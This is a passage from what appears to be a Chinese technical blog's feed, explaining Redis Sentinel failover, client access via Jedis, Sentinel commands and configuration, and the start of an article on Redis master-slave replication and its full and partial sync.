Sentinel查看，发现主节点已经切换成6380节点。</p><p>但是同时可以发现，哨兵节点认为新的主节点仍然有2个从节点，这是因为哨兵在将6380切换成主节点的同时，将6379节点置为其从节点；虽然6379从节点已经挂掉，但是由于哨兵并不会对从节点进行客观下线（其含义将在原理部分介绍），因此认为该从节点一直存在。当6379节点重新启动后，会自动变成6380节点的从节点。下面验证一下。</p><p>（4）重启6379节点：可以看到6379节点成为了6380节点的从节点。</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic8.png"><p>（5）在故障转移阶段，哨兵和主从节点的配置文件都会被改写。</p><p>对于主从节点，主要是slaveof配置的变化：新的主节点没有了slaveof配置，其从节点则slaveof新的主节点。</p><p>对于哨兵节点，除了主从节点信息的变化，纪元(epoch)也会变化，下图中可以看到纪元相关的参数都+1了。</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic9.png"><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>哨兵系统的搭建过程，有几点需要注意：</p><ul><li>哨兵系统中的主从节点，与普通的主从节点并没有什么区别，故障发现和转移是由哨兵来控制和完成的。</li><li>哨兵节点本质上是redis节点。</li><li>每个哨兵节点，只需要配置监控主节点，便可以自动发现其他的哨兵节点和从节点。</li><li>在哨兵节点启动和故障转移阶段，各个节点的配置文件会被重写(config rewrite)。</li><li>本章的例子中，一个哨兵只监控了一个主节点；实际上，一个哨兵可以监控多个主节点，通过配置多条sentinel monitor即可实现。</li></ul><h3 id="客户端访问哨兵系统"><a href="#客户端访问哨兵系统" class="headerlink" title="客户端访问哨兵系统"></a>客户端访问哨兵系统</h3><p>上一小节演示了哨兵的两大作用：监控和自动故障转移，本小节则结合客户端演示哨兵的另外两个作用：配置提供者和通知。</p><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>在介绍客户端的原理之前，先以Java客户端Jedis为例，演示一下使用方法：下面代码可以连接我们刚刚搭建的哨兵系统，并进行各种读写操作（代码中只演示如何连接哨兵，异常处理、资源关闭等未考虑）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testSentinel</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">         String masterName = <span class="string">"mymaster"</span>;</span><br><span class="line">         Set&lt;String&gt; sentinels = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">         sentinels.add(<span class="string">"192.168.92.128:26379"</span>);</span><br><span class="line">         sentinels.add(<span class="string">"192.168.92.128:26380"</span>);</span><br><span class="line">         sentinels.add(<span class="string">"192.168.92.128:26381"</span>);</span><br><span class="line"> </span><br><span class="line">         JedisSentinelPool pool = <span class="keyword">new</span> JedisSentinelPool(masterName, sentinels); <span class="comment">//初始化过程做了很多工作</span></span><br><span class="line">         Jedis jedis = pool.getResource();</span><br><span class="line">         jedis.set(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">         pool.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端原理"><a href="#客户端原理" class="headerlink" title="客户端原理"></a>客户端原理</h4><p>Jedis客户端对哨兵提供了很好的支持。如上述代码所示，我们只需要向Jedis提供哨兵节点集合和masterName，构造JedisSentinelPool对象；然后便可以像使用普通redis连接池一样来使用了：通过pool.getResource()获取连接，执行具体的命令。</p><p>在整个过程中，我们的代码不需要显式的指定主节点的地址，就可以连接到主节点；代码中对故障转移没有任何体现，就可以在哨兵完成故障转移后自动的切换主节点。之所以可以做到这一点，是因为在JedisSentinelPool的构造器中，进行了相关的工作；主要包括以下两点：</p><p>（1）遍历哨兵节点，获取主节点信息：遍历哨兵节点，通过其中一个哨兵节点+masterName获得主节点的信息；该功能是通过调用哨兵节点的sentinel get-master-addr-by-name命令实现，该命令示例如下：</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic10.png"><p>一旦获得主节点信息，停止遍历（因此一般来说遍历到第一个哨兵节点，循环就停止了）。</p><p>（2）增加对哨兵的监听：这样当发生故障转移时，客户端便可以收到哨兵的通知，从而完成主节点的切换。具体做法是：利用redis提供的发布订阅功能，为每一个哨兵节点开启一个单独的线程，订阅哨兵节点的+switch-master频道，当收到消息时，重新初始化连接池。</p><h4 id="通过客户端原理的介绍，可以加深对哨兵功能的理解："><a href="#通过客户端原理的介绍，可以加深对哨兵功能的理解：" class="headerlink" title="通过客户端原理的介绍，可以加深对哨兵功能的理解："></a>通过客户端原理的介绍，可以加深对哨兵功能的理解：</h4><p>（1）配置提供者：客户端可以通过哨兵节点+masterName获取主节点信息，在这里哨兵起到的作用就是配置提供者。</p><p><strong>需要注意的是，哨兵只是配置提供者，而不是代理</strong>。二者的区别在于：如果是配置提供者，客户端在通过哨兵获得主节点信息后，会直接建立到主节点的连接，后续的请求(如set/get)会直接发向主节点；如果是代理，客户端的每一次请求都会发向哨兵，哨兵再通过主节点处理请求。</p><p>举一个例子可以很好的理解哨兵的作用是配置提供者，而不是代理。在前面部署的哨兵系统中，将哨兵节点的配置文件进行如下修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster 192.168.92.128 6379 2</span><br><span class="line">改为</span><br><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br></pre></td></tr></table></figure><p>然后，将前述客户端代码在局域网的另外一台机器上运行，会发现客户端无法连接主节点；这是因为哨兵作为配置提供者，客户端通过它查询到主节点的地址为127.0.0.1:6379，客户端会向127.0.0.1:6379建立redis连接，自然无法连接。如果哨兵是代理，这个问题就不会出现了。</p><p>（2）通知：哨兵节点在故障转移完成后，会将新的主节点信息发送给客户端，以便客户端及时切换主节点。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>前面介绍了哨兵部署、使用的基本方法，本部分介绍哨兵实现的基本原理。</p><h4 id="哨兵节点支持的命令"><a href="#哨兵节点支持的命令" class="headerlink" title="哨兵节点支持的命令"></a>哨兵节点支持的命令</h4><p>哨兵节点作为运行在特殊模式下的redis节点，其支持的命令与普通的redis节点不同。在运维中，我们可以通过这些命令查询或修改哨兵系统；不过更重要的是，哨兵系统要实现故障发现、故障转移等各种功能，离不开哨兵节点之间的通信，而通信的很大一部分是通过哨兵节点支持的命令来实现的。下面介绍哨兵节点支持的主要命令。</p><p>（1）基础查询：通过这些命令，可以查询哨兵系统的拓扑结构、节点信息、配置信息等。</p><ul><li>info sentinel：获取监控的所有主节点的基本信息</li><li>sentinel masters：获取监控的所有主节点的详细信息</li><li>sentinel master mymaster：获取监控的主节点mymaster的详细信息</li><li>sentinel slaves mymaster：获取监控的主节点mymaster的从节点的详细信息</li><li>sentinel sentinels mymaster：获取监控的主节点mymaster的哨兵节点的详细信息</li><li>sentinel get-master-addr-by-name mymaster：获取监控的主节点mymaster的地址信息，前文已有介绍</li><li>sentinel is-master-down-by-addr：哨兵节点之间可以通过该命令询问主节点是否下线，从而对是否客观下线做出判断</li></ul><p>（2）增加/移除对主节点的监控</p><p>sentinel monitor mymaster2 192.168.92.128 16379 2：与部署哨兵节点时配置文件中的sentinel monitor功能完全一样，不再详述</p><p>sentinel remove mymaster2：取消当前哨兵节点对主节点mymaster2的监控</p><p>（3）强制故障转移</p><p>sentinel failover mymaster：该命令可以强制对mymaster执行故障转移，即便当前的主节点运行完好；例如，如果当前主节点所在机器即将报废，便可以提前通过failover命令进行故障转移。</p><ol start="2"><li>基本原理<br>关于哨兵的原理，关键是了解以下几个概念。</li></ol><p>（1）定时任务：每个哨兵节点维护了3个定时任务。定时任务的功能分别如下：通过向主从节点发送info命令获取最新的主从结构；通过发布订阅功能获取其他哨兵节点的信息；通过向其他节点发送ping命令进行心跳检测，判断是否下线。</p><p>（2）主观下线：在心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线；与主观下线相对应的是客观下线。</p><p>（3）客观下线：哨兵节点在对主节点进行主观下线后，会通过sentinel is-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。</p><p><strong>需要特别注意的是，客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作</strong>。</p><p>（4）选举领导者哨兵节点：当主节点被判断客观下线以后，各个哨兵节点会进行协商，选举出一个领导者哨兵节点，并由该领导者节点对其进行故障转移操作。</p><p>监视该主节点的所有哨兵都有可能被选为领导者，选举使用的算法是Raft算法；Raft算法的基本思路是先到先得：即在一轮选举中，哨兵A向B发送成为领导者的申请，如果B没有同意过其他哨兵，则会同意A成为领导者。选举的具体过程这里不做详细描述，一般来说，哨兵选择的过程很快，谁先完成客观下线，一般就能成为领导者。</p><p>（5）故障转移：选举出的领导者哨兵，开始进行故障转移操作，该操作大体可以分为3个步骤：</p><ul><li>在从节点中选择新的主节点：选择的原则是，首先过滤掉不健康的从节点；然后选择优先级最高的从节点(由slave-priority指定)；如果优先级无法区分，则选择复制偏移量最大的从节点；如果仍无法区分，则选择runid最小的从节点。</li><li>更新主从状态：通过slaveof no one命令，让选出来的从节点成为主节点；并通过slaveof命令让其他节点成为其从节点。</li><li>将已经下线的主节点(即6379)设置为新的主节点的从节点，当6379重新上线后，它会成为新的主节点的从节点。</li></ul><p>通过上述几个关键概念，可以基本了解哨兵的工作原理。为了更形象的说明，下图展示了领导者哨兵节点的日志，包括从节点启动到完成故障转移。</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic11.png"><h3 id="配置与实践建议"><a href="#配置与实践建议" class="headerlink" title="配置与实践建议"></a>配置与实践建议</h3><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>下面介绍与哨兵相关的几个配置。</p><p>（1） sentinel monitor {masterName} {masterIp} {masterPort} {quorum}</p><p>sentinel monitor是哨兵最核心的配置，在前文讲述部署哨兵节点时已说明，其中：masterName指定了主节点名称，masterIp和masterPort指定了主节点地址，quorum是判断主节点客观下线的哨兵数量阈值：当判定主节点下线的哨兵数量达到quorum时，对主节点进行客观下线。建议取值为哨兵数量的一半加1。</p><p>（2） sentinel down-after-milliseconds {masterName} {time}</p><p>sentinel down-after-milliseconds与主观下线的判断有关：哨兵使用ping命令对其他节点进行心跳检测，如果其他节点超过down-after-milliseconds配置的时间没有回复，哨兵就会将其进行主观下线。该配置对主节点、从节点和哨兵节点的主观下线判定都有效。</p><p>down-after-milliseconds的默认值是30000，即30s；可以根据不同的网络环境和应用要求来调整：值越大，对主观下线的判定会越宽松，好处是误判的可能性小，坏处是故障发现和故障转移的时间变长，客户端等待的时间也会变长。例如，如果应用对可用性要求较高，则可以将值适当调小，当故障发生时尽快完成转移；如果网络环境相对较差，可以适当提高该阈值，避免频繁误判。</p><p>（3） sentinel parallel-syncs {masterName} {number}</p><p>sentinel parallel-syncs与故障转移之后从节点的复制有关：它规定了每次向新的主节点发起复制操作的从节点个数。例如，假设主节点切换完成之后，有3个从节点要向新的主节点发起复制；如果parallel-syncs=1，则从节点会一个一个开始复制；如果parallel-syncs=3，则3个从节点会一起开始复制。</p><p>parallel-syncs取值越大，从节点完成复制的时间越快，但是对主节点的网络负载、硬盘负载造成的压力也越大；应根据实际情况设置。例如，如果主节点的负载较低，而从节点对服务可用的要求较高，可以适量增加parallel-syncs取值。parallel-syncs的默认值是1。</p><p>（4） sentinel failover-timeout {masterName} {time}</p><p>sentinel failover-timeout与故障转移超时的判断有关，但是该参数不是用来判断整个故障转移阶段的超时，而是其几个子阶段的超时，例如如果主节点晋升从节点时间超过timeout，或从节点向新的主节点发起复制操作的时间(不包括复制数据的时间)超过timeout，都会导致故障转移超时失败。</p><p>failover-timeout的默认值是180000，即180s；如果超时，则下一次该值会变为原来的2倍。</p><p>（5）除上述几个参数外，还有一些其他参数，如安全验证相关的参数，这里不做介绍。</p><h4 id="实践建议"><a href="#实践建议" class="headerlink" title="实践建议"></a>实践建议</h4><p>（1）哨兵节点的数量应不止一个，一方面增加哨兵节点的冗余，避免哨兵本身成为高可用的瓶颈；另一方面减少对下线的误判。此外，这些不同的哨兵节点应部署在不同的物理机上。</p><p>（2）哨兵节点的数量应该是奇数，便于哨兵通过投票做出“决策”：领导者选举的决策、客观下线的决策等。</p><p>（3）各个哨兵节点的配置应一致，包括硬件、参数等；此外，所有节点都应该使用ntp或类似服务，保证时间准确、一致。</p><p>（4）哨兵的配置提供者和通知客户端功能，需要客户端的支持才能实现，如前文所说的Jedis；如果开发者使用的库未提供相应支持，则可能需要开发者自己实现。</p><p>（5）当哨兵系统中的节点在docker（或其他可能进行端口映射的软件）中部署时，应特别注意端口映射可能会导致哨兵系统无法正常工作，因为哨兵的工作基于与其他节点的通信，而docker的端口映射可能导致哨兵无法连接到其他节点。例如，哨兵之间互相发现，依赖于它们对外宣称的IP和port，如果某个哨兵A部署在做了端口映射的docker中，那么其他哨兵使用A宣称的port无法连接到A。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>本文首先介绍了哨兵的作用：监控、故障转移、配置提供者和通知；然后讲述了哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；再然后简要说明了哨兵实现的基本原理；最后给出了关于哨兵实践的一些建议。</p><p>在主从复制的基础上，哨兵引入了主节点的自动故障转移，进一步提高了Redis的高可用性；但是哨兵的缺陷同样很明显：哨兵无法对从节点进行自动故障转移，在读写分离场景下，从节点故障会导致读服务不可用，需要我们对从节点做额外的监控、切换操作。</p><p>此外，哨兵仍然没有解决写操作无法负载均衡、及存储能力受到单机限制的问题；这些问题的解决需要使用集群，我将在后面的文章中介绍，欢迎关注。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis之主从复制</title>
      <link href="/2019/04/06/2019-04-06-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
      <url>/2019/04/06/2019-04-06-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Redis主从复制的方方面面 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="主从复制概述"><a href="#主从复制概述" class="headerlink" title="主从复制概述"></a>主从复制概述</h3><blockquote><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p></blockquote><p>主从复制的作用主要包括：</p><ul><li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li><li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li><li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li><li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础</li></ul><h3 id="如何使用主从复制"><a href="#如何使用主从复制" class="headerlink" title="如何使用主从复制"></a>如何使用主从复制</h3><p>为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。</p><h4 id="建立复制"><a href="#建立复制" class="headerlink" title="建立复制"></a>建立复制</h4><p>需要注意，主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</p><p>从节点开启主从复制，有3种方式：</p><ul><li>配置文件：在从服务器的配置文件中加入：slaveof [masterip] [masterport]</li><li>启动命令：redis-server启动命令后加入 –slaveof [masterip] [masterport]</li><li>客户端命令：Redis服务器启动后，直接通过客户端执行命令：slaveof [masterip] [masterport]，则该Redis实例成为从节点。</li></ul><p>上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><h5 id="准备工作：启动两个节点"><a href="#准备工作：启动两个节点" class="headerlink" title="准备工作：启动两个节点"></a>准备工作：启动两个节点</h5><p>方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic1.png"><p>启动后可以看到：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic2.png"><p>两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。</p><h5 id="建立复制-1"><a href="#建立复制-1" class="headerlink" title="建立复制"></a>建立复制</h5><p>此时在6380节点执行slaveof命令，使之变为从节点：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic3.png"><h5 id="观察效果"><a href="#观察效果" class="headerlink" title="观察效果"></a>观察效果</h5><p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p><p>（1）首先在从节点查询一个不存在的key：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic4.png"><p>（2）然后在主节点中增加这个key：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic5.png"><p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic6.png"><p>（4）然后在主节点删除这个key：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic7.png"><p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic8.png"><h5 id="断开复制"><a href="#断开复制" class="headerlink" title="断开复制"></a>断开复制</h5><p>通过slaveof [masterip] [masterport] 命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p><p>从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic9.png"><p>主节点打印日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic10.png"><h3 id="主从复制的实现原理"><a href="#主从复制的实现原理" class="headerlink" title="主从复制的实现原理"></a>主从复制的实现原理</h3><p>上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。</p><p>主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段。下面分别进行介绍。</p><h4 id="连接建立阶段"><a href="#连接建立阶段" class="headerlink" title="连接建立阶段"></a>连接建立阶段</h4><p>该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。</p><h5 id="步骤1：保存主节点信息"><a href="#步骤1：保存主节点信息" class="headerlink" title="步骤1：保存主节点信息"></a>步骤1：保存主节点信息</h5><p>从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。</p><p>需要注意的是，<strong>slaveof是异步命令，从节点完成主节点ip和port的保存后，向发送slaveof命令的客户端直接返回OK，实际的复制操作在这之后才开始进行。</strong></p><p>这个过程中，可以看到从节点打印日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic11.png"><h5 id="步骤2：建立socket连接"><a href="#步骤2：建立socket连接" class="headerlink" title="步骤2：建立socket连接"></a>步骤2：建立socket连接</h5><p>从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：</p><ul><li>从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。</li><li>主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，<strong>并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。</strong></li></ul><p>这个过程中，从节点打印日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic12.png"><h5 id="步骤3：发送ping命令"><a href="#步骤3：发送ping命令" class="headerlink" title="步骤3：发送ping命令"></a>步骤3：发送ping命令</h5><p>从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。</p><p>从节点发送ping命令后，可能出现3种情况：</p><ul><li>返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。</li><li>超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。</li><li>返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。</li></ul><p>在主节点返回pong情况下，从节点打印日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic13.png"><h5 id="步骤4：身份验证"><a href="#步骤4：身份验证" class="headerlink" title="步骤4：身份验证"></a>步骤4：身份验证</h5><p>如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。</p><p>如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。</p><h5 id="步骤5：发送从节点端口信息"><a href="#步骤5：发送从节点端口信息" class="headerlink" title="步骤5：发送从节点端口信息"></a>步骤5：发送从节点端口信息</h5><p>身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。</p><h4 id="数据同步阶段"><a href="#数据同步阶段" class="headerlink" title="数据同步阶段"></a>数据同步阶段</h4><p>主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。</p><p>数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。</p><p>需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。</p><h4 id="命令传播阶段"><a href="#命令传播阶段" class="headerlink" title="命令传播阶段"></a>命令传播阶段</h4><p>数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。</p><p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。</p><p>延迟与不一致</p><p>需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。</p><p>repl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。</p><p>一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。</p><h3 id="数据同步阶段-全量复制和部分复制"><a href="#数据同步阶段-全量复制和部分复制" class="headerlink" title="数据同步阶段 - 全量复制和部分复制"></a>数据同步阶段 - 全量复制和部分复制</h3><p>在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。</p><ul><li>全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。</li><li>部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。</li></ul><h4 id="全量复制"><a href="#全量复制" class="headerlink" title="全量复制"></a>全量复制</h4><p>Redis通过psync命令进行全量复制的过程如下：</p><ul><li>从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。</li><li>主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令</li><li>主节点的bgsave执行完成后，将RDB文件发送给从节点；从节点首先清除自己的旧数据，然后载入接收的RDB文件，将数据库状态更新至主节点执行bgsave时的数据库状态</li><li>主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态</li><li>如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态</li></ul><p>下面是执行全量复制时，主从节点打印的日志。可以看出日志内容与上述步骤是完全对应的。</p><p>主节点的打印日志如下：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic14.png"><p>从节点打印日志如下图所示：</p><img src="/2019/04/06/2019-04-06-深入学习Redis之主从复制/pic15.png"><p>其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。</p><p>通过全量复制的过程可以看出，全量复制是非常重型的操作：</p><ul><li>主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 <a href="/2019/04/04/深入学习Redis之持久化/">深入学习Redis之持久化</a></li><li>主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗</li><li>从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗</li></ul><h4 id="部分复制"><a href="#部分复制" class="headerlink" title="部分复制"></a>部分复制</h4><p>由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。</p><p>部分复制的实现，依赖于三个重要的概念：</p><h5 id="复制偏移量"><a href="#复制偏移量" class="headerlink" title="复制偏移量"></a>复制偏移量</h5><p>主节点和从节点分别维护一个复制偏移量（offset），代表的是主节点向从节点传递的字节数；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。</p><p>offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。</p><h5 id="复制积压缓冲区"><a href="#复制积压缓冲区" class="headerlink" title="复制积压缓冲区"></a>复制积压缓冲区</h5><p>复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。</p><p>在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。</p><p>由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。</p><p>从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：</p><ul><li>如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；</li><li>如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。</li></ul><h5 id="服务器运行ID-runid"><a href="#服务器运行ID-runid" class="headerlink" 